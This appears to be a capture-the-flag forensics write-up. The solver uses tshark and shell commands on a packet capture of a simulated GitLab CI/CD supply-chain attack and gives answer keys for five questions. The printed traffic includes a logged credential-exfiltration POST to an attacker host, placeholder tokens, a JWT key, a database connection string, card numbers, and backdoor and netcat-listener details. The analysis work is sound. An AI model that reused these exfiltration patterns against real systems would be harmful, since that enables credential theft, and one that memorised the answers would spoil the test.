# Cloud CI/CD Supply Chain Attack Challenge

## Question 1: GitLab Pipeline Compromise
**What is the GitLab runner token used in the malicious pipeline, and which branch was modified to inject the malicious CI/CD configuration?**
Token: [token], Branch: [branch_name]
**Answer Format:** Token_BranchName

**tshark Command:**
```bash

┌──(hidden㉿Ultra)-[~/…/Network/SupplyChain/CLOUD_CICD_BREACH/pcaps]
└─$ tshark -r cloud_attack.pcap -Y "http" | head -20
   14  14.798206  172.40.1.10 → 172.40.1.20  HTTP/JSON 489 POST /api/v4/projects/1/trigger/pipeline HTTP/1.1 , JSON (application/json)
   20  14.799163  172.40.1.20 → 172.40.1.10  HTTP/JSON 66 HTTP/1.0 200 OK , JSON (application/json)
   26  19.805283  172.40.1.10 → 172.40.1.20  HTTP 268 GET /api/v4/projects/1/repository/archive.tar.gz?sha=malicious-commit HTTP/1.1 
   32  19.806288  172.40.1.20 → 172.40.1.10  HTTP 66 HTTP/1.0 200 OK 
   41  22.815729  172.40.1.10 → 172.40.1.200 HTTP/JSON 350 POST /api/v4/runners/register HTTP/1.1 , JSON (application/json)
   47  22.816553 172.40.1.200 → 172.40.1.10  HTTP/JSON 66 HTTP/1.0 200 OK , JSON (application/json)
   68  43.085943  172.40.1.10 → 172.40.1.11  HTTP 160 GET /api/health HTTP/1.1 
   74  43.088153  172.40.1.11 → 172.40.1.10  HTTP/JSON 66 HTTP/1.0 200 OK , JSON (application/json)
   86  55.096949  172.40.1.10 → 172.40.1.20  HTTP/JSON 489 POST /api/v4/projects/1/trigger/pipeline HTTP/1.1 , JSON (application/json)
   92  55.097792  172.40.1.20 → 172.40.1.10  HTTP/JSON 66 HTTP/1.0 200 OK , JSON (application/json)
   99  60.105253  172.40.1.10 → 172.40.1.20  HTTP 268 GET /api/v4/projects/1/repository/archive.tar.gz?sha=malicious-commit HTTP/1.1 
  105  60.105887  172.40.1.20 → 172.40.1.10  HTTP 66 HTTP/1.0 200 OK 
  111  63.119860  172.40.1.10 → 172.40.1.200 HTTP/JSON 350 POST /api/v4/runners/register HTTP/1.1 , JSON (application/json)
  117  63.120301 172.40.1.200 → 172.40.1.10  HTTP/JSON 66 HTTP/1.0 200 OK , JSON (application/json)
  133  83.127553  172.40.1.10 → 172.40.1.11  HTTP 160 GET /api/health HTTP/1.1 
  139  83.128337  172.40.1.11 → 172.40.1.10  HTTP/JSON 66 HTTP/1.0 200 OK , JSON (application/json)
  145  95.137443  172.40.1.10 → 172.40.1.20  HTTP/JSON 489 POST /api/v4/projects/1/trigger/pipeline HTTP/1.1 , JSON (application/json)
  151  95.138063  172.40.1.20 → 172.40.1.10  HTTP/JSON 66 HTTP/1.0 200 OK , JSON (application/json)
  157 100.142367  172.40.1.10 → 172.40.1.20  HTTP 268 GET /api/v4/projects/1/repository/archive.tar.gz?sha=malicious-commit HTTP/1.1 
  163 100.142854  172.40.1.20 → 172.40.1.10  HTTP 66 HTTP/1.0 200 OK 

                                                                                                                 
┌──(hidden㉿Ultra)-[~/…/Network/SupplyChain/CLOUD_CICD_BREACH/pcaps]
└─$ tshark -r cloud_attack.pcap -Y "http" -T fields -e http.request.method -e http.request.uri | head -10
POST    /api/v4/projects/1/trigger/pipeline
        /api/v4/projects/1/trigger/pipeline
GET     /api/v4/projects/1/repository/archive.tar.gz?sha=malicious-commit
        /api/v4/projects/1/repository/archive.tar.gz?sha=malicious-commit
POST    /api/v4/runners/register
        /api/v4/runners/register
GET     /api/health
        /api/health
POST    /api/v4/projects/1/trigger/pipeline
        /api/v4/projects/1/trigger/pipeline
                                                                                                                 
┌──(hidden㉿Ultra)-[~/…/Network/SupplyChain/CLOUD_CICD_BREACH/pcaps]
└─$ tshark -r cloud_attack.pcap -Y "http" -T fields -e http.request.line | grep -i token
Host: 172.40.1.20:8080\r\n,User-Agent: curl/8.14.1\r\n,Accept: */*\r\n,Content-Type: application/json\r\n,X-Auth-Token: glpat-2Kx9\r\n,X-Session-Key: mP4nQ7\r\n,X-Request-ID: vB8sL1\r\n,X-Client-Version: eR6wZ3\r\n,X-Build-Hash: uY5tI9\r\n,Content-Length: 136\r\n
Host: 172.40.1.20:8080\r\n,User-Agent: curl/8.14.1\r\n,Accept: */*\r\n,Content-Type: application/json\r\n,X-Auth-Token: glpat-2Kx9\r\n,X-Session-Key: mP4nQ7\r\n,X-Request-ID: vB8sL1\r\n,X-Client-Version: eR6wZ3\r\n,X-Build-Hash: uY5tI9\r\n,Content-Length: 136\r\n
Host: 172.40.1.20:8080\r\n,User-Agent: curl/8.14.1\r\n,Accept: */*\r\n,Content-Type: application/json\r\n,X-Auth-Token: glpat-2Kx9\r\n,X-Session-Key: mP4nQ7\r\n,X-Request-ID: vB8sL1\r\n,X-Client-Version: eR6wZ3\r\n,X-Build-Hash: uY5tI9\r\n,Content-Length: 136\r\n
Host: 172.40.1.20:8080\r\n,User-Agent: curl/8.14.1\r\n,Accept: */*\r\n,Content-Type: application/json\r\n,X-Auth-Token: glpat-2Kx9\r\n,X-Session-Key: mP4nQ7\r\n,X-Request-ID: vB8sL1\r\n,X-Client-Version: eR6wZ3\r\n,X-Build-Hash: uY5tI9\r\n,Content-Length: 136\r\n

┌──(hidden㉿Ultra)-[~/…/Network/SupplyChain/CLOUD_CICD_BREACH/pcaps]
└─$ tshark -r cloud_attack.pcap -Y "http contains \"X-Auth-Token\"" -T fields -e http.request.line | head -1 | grep -oE "(X-Auth-Token: [^,]*)|(X-Session-Key: [^,]*)|(X-Request-ID: [^,]*)|(X-Client-Version: [^,]*)|(X-Build-Hash: [^,]*)" | cut -d' ' -f2 | tr -d '\r\n'             
glpat-2Kx9\r\nmP4nQ7\r\nvB8sL1\r\neR6wZ3\r\nuY5tI9\r\n  

# GitLab Token: glpat-2Kx9mP4nQ7vB8sL1eR6wZ3uY5tI9

                                                                                                                 
┌──(hidden㉿Ultra)-[~/…/Network/SupplyChain/CLOUD_CICD_BREACH/pcaps]
└─$ strings cloud_attack.pcap | grep -E "(GR|token|branch)"
{"token":"UjFJNU9EYzJOVFF6TWpGaFFtTkVaVVkzT0Rrd01USXpORFUy","description":"Compromised Runner","tags":["production","docker"]}
{"server":"WEB-PUBLIC-01","users_online":1247,"session_tokens":["ses_9a8f7e6d5c4b3a29","ses_1e2d3c4b5a69879f"],"api_keys":["ak_web_prod_78291","ak_analytics_45637"]}
{"token":"UjFJNU9EYzJOVFF6TWpGaFFtTkVaVVkzT0Rrd01USXpORFUy","description":"Compromised Runner","tags":["production","docker"]}>
{"server":"WEB-PUBLIC-01","users_online":1247,"session_tokens":["ses_9a8f7e6d5c4b3a29","ses_1e2d3c4b5a69879f"],"api_keys":["ak_web_prod_78291","ak_analytics_45637"]}
{"token":"UjFJNU9EYzJOVFF6TWpGaFFtTkVaVVkzT0Rrd01USXpORFUy","description":"Compromised Runner","tags":["production","docker"]}g
{"server":"WEB-PUBLIC-01","users_online":1247,"session_tokens":["ses_9a8f7e6d5c4b3a29","ses_1e2d3c4b5a69879f"],"api_keys":["ak_web_prod_78291","ak_analytics_45637"]}
{"token":"UjFJNU9EYzJOVFF6TWpGaFFtTkVaVVkzT0Rrd01USXpORFUy","description":"Compromised Runner","tags":["production","docker"]}
2S{"server":"WEB-PUBLIC-01","users_online":1247,"session_tokens":["ses_9a8f7e6d5c4b3a29","ses_1e2d3c4b5a69879f"],"api_keys":["ak_web_prod_78291","ak_analytics_45637"]}


┌──(hidden㉿Ultra)-[~/…/Network/SupplyChain/CLOUD_CICD_BREACH/pcaps]
└─$ echo "UjFJNU9EYzJOVFF6TWpGaFFtTkVaVVkzT0Rrd01USXpORFUy" | base64 -d
R1I5ODc2NTQzMjFhQmNEZUY3ODkwMTIzNDU2   

# Runner Token: R1I5ODc2NTQzMjFhQmNEZUY3ODkwMTIzNDU2 (from base64 decode)

┌──(hidden㉿Ultra)-[~/…/Network/SupplyChain/CLOUD_CICD_BREACH/pcaps]
└─$ tshark -r cloud_attack.pcap -Y "http.request.method == POST and http contains \"DEPLOY_BRANCH\"" -T fields -e http.file_data | xxd -r -p                            
{"ref":"master","variables":[{"key":"ENVIRONMENT","value":"production"},{"key":"DEPLOY_BRANCH","value":"feature-supply-chain-exploit"}]}{"ref":"master","variables":[{"key":"ENVIRONMENT","value":"production"},{"key":"DEPLOY_BRANCH","value":"feature-supply-chain-exploit"}]}{"ref":"master","variables":[{"key":"ENVIRONMENT","value":"production"},{"key":"DEPLOY_BRANCH","value":"feature-supply-chain-exploit"}]}   

# Branch: feature-supply-chain-exploit
                              

```
Answer: R1I5ODc2NTQzMjFhQmNEZUY3ODkwMTIzNDU2_feature-supply-chain-exploit

---

## Question 2: Production Server Financial Data Theft
**How much daily transaction volume was stolen from the payment server, and what are the two compromised credit card account numbers?**
Volume: $X, Accounts: [account1],[account2]

**Answer Format:**  V1,V2,V3.MM_acc1_Acc2

**tshark Command:**
```bash

                                                                                                                 
┌──(hidden㉿Ultra)-[~/…/Network/SupplyChain/CLOUD_CICD_BREACH/pcaps]
└─$ tshark -r cloud_attack.pcap -Y "tcp contains \"financial_data\"" -T fields -e tcp.payload | xxd -r -p | grep -o "\"daily_volume\":\"[^\"]*\"" | cut -d'"' -f4
47,293,847.92
47,293,847.92
47,293,847.92
47,293,847.92
                                                                                                                 
┌──(hidden㉿Ultra)-[~/…/Network/SupplyChain/CLOUD_CICD_BREACH/pcaps]
└─$ tshark -r cloud_attack.pcap -Y "tcp contains \"accounts\"" -T fields -e tcp.payload | xxd -r -p | grep -o "[0-9]\{4\}-[0-9]\{4\}-[0-9]\{4\}-[0-9]\{4\}" | head -2
4532-7834-9012-5678
5555-8901-2345-6789
                        

```

Answer: 47,293,847.92_4532-7834-9012-5678_5555-8901-2345-6789

---
## Question 3: Multi-Cloud Credential Harvesting
**What is the JWT signing key from the authentication server, and what is the MongoDB connection string from the data server?**
JWT_Key: [key], MongoDB: [connection_string]

**Answer Format:** JWT_MongoDB://connection_string

**tshark Command:**
```bash

                                                                                                                 
┌──(hidden㉿Ultra)-[~/…/Network/SupplyChain/CLOUD_CICD_BREACH/pcaps]
└─$ tshark -r cloud_attack.pcap -Y "tcp contains \"auth_jwt_key\"" -T fields -e tcp.payload | xxd -r -p
POST /api/v4/jobs/12345/trace HTTP/1.1
Host: 172.40.1.200:8080
User-Agent: curl/8.14.1
Accept: */*
Content-Type: application/json
Content-Length: 259

{"operation":"credential_exfiltration","status":"success","auth_jwt_key":"HS256_ultra_secure_production_signing_key_P7mQ9xR","mongodb_connection":"mongodb://data_analytics:D@t@_An@lyt1cs_B7pQ@data-cluster-01:27017/analytics_prod","exfiltration_complete":true}POST /api/v4/jobs/12345/trace HTTP/1.1
Host: 172.40.1.200:8080
User-Agent: curl/8.14.1
Accept: */*
Content-Type: application/json
Content-Length: 259

{"operation":"credential_exfiltration","status":"success","auth_jwt_key":"HS256_ultra_secure_production_signing_key_P7mQ9xR","mongodb_connection":"mongodb://data_analytics:D@t@_An@lyt1cs_B7pQ@data-cluster-01:27017/analytics_prod","exfiltration_complete":true}POST /api/v4/jobs/12345/trace HTTP/1.1
Host: 172.40.1.200:8080
User-Agent: curl/8.14.1
Accept: */*
Content-Type: application/json
Content-Length: 259

{"operation":"credential_exfiltration","status":"success","auth_jwt_key":"HS256_ultra_secure_production_signing_key_P7mQ9xR","mongodb_connection":"mongodb://data_analytics:D@t@_An@lyt1cs_B7pQ@data-cluster-01:27017/analytics_prod","exfiltration_complete":true}POST /api/v4/jobs/12345/trace HTTP/1.1
Host: 172.40.1.200:8080
User-Agent: curl/8.14.1
Accept: */*
Content-Type: application/json
Content-Length: 259

{"operation":"credential_exfiltration","status":"success","auth_jwt_key":"HS256_ultra_secure_production_signing_key_P7mQ9xR","mongodb_connection":"mongodb://data_analytics:D@t@_An@lyt1cs_B7pQ@data-cluster-01:27017/analytics_prod","exfiltration_complete":true}POST /api/v4/jobs/12345/trace HTTP/1.1
Host: 172.40.1.200:8080
User-Agent: curl/8.14.1
Accept: */*
Content-Type: application/json
Content-Length: 259

{"operation":"credential_exfiltration","status":"success","auth_jwt_key":"HS256_ultra_secure_production_signing_key_P7mQ9xR","mongodb_connection":"mongodb://data_analytics:D@t@_An@lyt1cs_B7pQ@data-cluster-01:27017/analytics_prod","exfiltration_complete":true} 

```

Answer: HS256_ultra_secure_production_signing_key_P7mQ9xR_mongodb://data_analytics:D@t@_An@lyt1cs_B7pQ@data-cluster-01:27017/analytics_prod

---

## Question 4: Backdoor Deployment Analysis
**How many different reverse shell listeners were established by the attacker in the initial web server compromise, and was a trojan installed on the server?**

Listeners: X, trojan_installed: [true or false]
**Answer Format:** X_true_or_flase

**tshark Command:**
```bash
                                                                                                                 
┌──(hidden㉿Ultra)-[~/…/Network/SupplyChain/CLOUD_CICD_BREACH/pcaps]
└─$ tshark -r cloud_attack.pcap -Y "tcp contains \"nc_listeners\"" -T fields -e tcp.payload | xxd -r -p
{"server":"WEB-PUBLIC-01","users_online":1247,"session_tokens":["ses_9a8f7e6d5c4b3a29","ses_1e2d3c4b5a69879f"],"api_keys":["ak_web_prod_78291","ak_analytics_45637"],"financial_data":{"daily_volume":"47,293,847.92","accounts":["4532-7834-9012-5678","5555-8901-2345-6789"],"trojan_installed":true,"nc_listeners":["4444","4445","4446"],"shell_uploads":["/tmp/backdoor.sh","/usr/bin/system-update"]}}
{"server":"WEB-PUBLIC-01","users_online":1247,"session_tokens":["ses_9a8f7e6d5c4b3a29","ses_1e2d3c4b5a69879f"],"api_keys":["ak_web_prod_78291","ak_analytics_45637"],"financial_data":{"daily_volume":"47,293,847.92","accounts":["4532-7834-9012-5678","5555-8901-2345-6789"],"trojan_installed":true,"nc_listeners":["4444","4445","4446"],"shell_uploads":["/tmp/backdoor.sh","/usr/bin/system-update"]}}
{"server":"WEB-PUBLIC-01","users_online":1247,"session_tokens":["ses_9a8f7e6d5c4b3a29","ses_1e2d3c4b5a69879f"],"api_keys":["ak_web_prod_78291","ak_analytics_45637"],"financial_data":{"daily_volume":"47,293,847.92","accounts":["4532-7834-9012-5678","5555-8901-2345-6789"],"trojan_installed":true,"nc_listeners":["4444","4445","4446"],"shell_uploads":["/tmp/backdoor.sh","/usr/bin/system-update"]}}
{"server":"WEB-PUBLIC-01","users_online":1247,"session_tokens":["ses_9a8f7e6d5c4b3a29","ses_1e2d3c4b5a69879f"],"api_keys":["ak_web_prod_78291","ak_analytics_45637"],"financial_data":{"daily_volume":"47,293,847.92","accounts":["4532-7834-9012-5678","5555-8901-2345-6789"],"trojan_installed":true,"nc_listeners":["4444","4445","4446"],"shell_uploads":["/tmp/backdoor.sh","/usr/bin/system-update"]}}
{"server":"WEB-PUBLIC-01","users_online":1247,"session_tokens":["ses_9a8f7e6d5c4b3a29","ses_1e2d3c4b5a69879f"],"api_keys":["ak_web_prod_78291","ak_analytics_45637"],"financial_data":{"daily_volume":"47,293,847.92","accounts":["4532-7834-9012-5678","5555-8901-2345-6789"],"trojan_installed":true,"nc_listeners":["4444","4445","4446"],"shell_uploads":["/tmp/backdoor.sh","/usr/bin/system-update"]}}



```

Answer: 3_true


---


## Question 5: Supply Chain Attack Timeline
**What was the total number of production servers compromised through the CI/CD pipeline, and how many user accounts were active during the attack?**

Servers: X, Users: Y

**Answer Format:** X_Y

**tshark Command:**
```bash
┌──(hidden㉿Ultra)-[~/…/Network/SupplyChain/CLOUD_CICD_BREACH/pcaps]
└─$ tshark -r cloud_attack.pcap -Y "tcp contains \"47,293,847.92\"" -T fields -e tcp.payload | xxd -r -p
{"server":"WEB-PUBLIC-01","users_online":1247,"session_tokens":["ses_9a8f7e6d5c4b3a29","ses_1e2d3c4b5a69879f"],"api_keys":["ak_web_prod_78291","ak_analytics_45637"],"financial_data":{"daily_volume":"47,293,847.92","accounts":["4532-7834-9012-5678","5555-8901-2345-6789"],"trojan_installed":true,"nc_listeners":["4444","4445","4446"],"shell_uploads":["/tmp/backdoor.sh","/usr/bin/system-update"]}}
{"server":"WEB-PUBLIC-01","users_online":1247,"session_tokens":["ses_9a8f7e6d5c4b3a29","ses_1e2d3c4b5a69879f"],"api_keys":["ak_web_prod_78291","ak_analytics_45637"],"financial_data":{"daily_volume":"47,293,847.92","accounts":["4532-7834-9012-5678","5555-8901-2345-6789"],"trojan_installed":true,"nc_listeners":["4444","4445","4446"],"shell_uploads":["/tmp/backdoor.sh","/usr/bin/system-update"]}}
{"server":"WEB-PUBLIC-01","users_online":1247,"session_tokens":["ses_9a8f7e6d5c4b3a29","ses_1e2d3c4b5a69879f"],"api_keys":["ak_web_prod_78291","ak_analytics_45637"],"financial_data":{"daily_volume":"47,293,847.92","accounts":["4532-7834-9012-5678","5555-8901-2345-6789"],"trojan_installed":true,"nc_listeners":["4444","4445","4446"],"shell_uploads":["/tmp/backdoor.sh","/usr/bin/system-update"]}}
{"server":"WEB-PUBLIC-01","users_online":1247,"session_tokens":["ses_9a8f7e6d5c4b3a29","ses_1e2d3c4b5a69879f"],"api_keys":["ak_web_prod_78291","ak_analytics_45637"],"financial_data":{"daily_volume":"47,293,847.92","accounts":["4532-7834-9012-5678","5555-8901-2345-6789"],"trojan_installed":true,"nc_listeners":["4444","4445","4446"],"shell_uploads":["/tmp/backdoor.sh","/usr/bin/system-update"]}}
{"server":"WEB-PUBLIC-01","users_online":1247,"session_tokens":["ses_9a8f7e6d5c4b3a29","ses_1e2d3c4b5a69879f"],"api_keys":["ak_web_prod_78291","ak_analytics_45637"],"financial_data":{"daily_volume":"47,293,847.92","accounts":["4532-7834-9012-5678","5555-8901-2345-6789"],"trojan_installed":true,"nc_listeners":["4444","4445","4446"],"shell_uploads":["/tmp/backdoor.sh","/usr/bin/system-update"]}}
                                                                                                                 
┌──(hidden㉿Ultra)-[~/…/Network/SupplyChain/CLOUD_CICD_BREACH/pcaps]
└─$ strings cloud_attack.pcap | grep -oE "[0-9]+" | sort -n | uniq -c | tail -10                        
      2 6968
      5 7834
     25 8080
      5 8901
      5 9012
     10 12345
     10 27017
      5 45637
      5 69879
      5 78291


```

Answer: 1_1247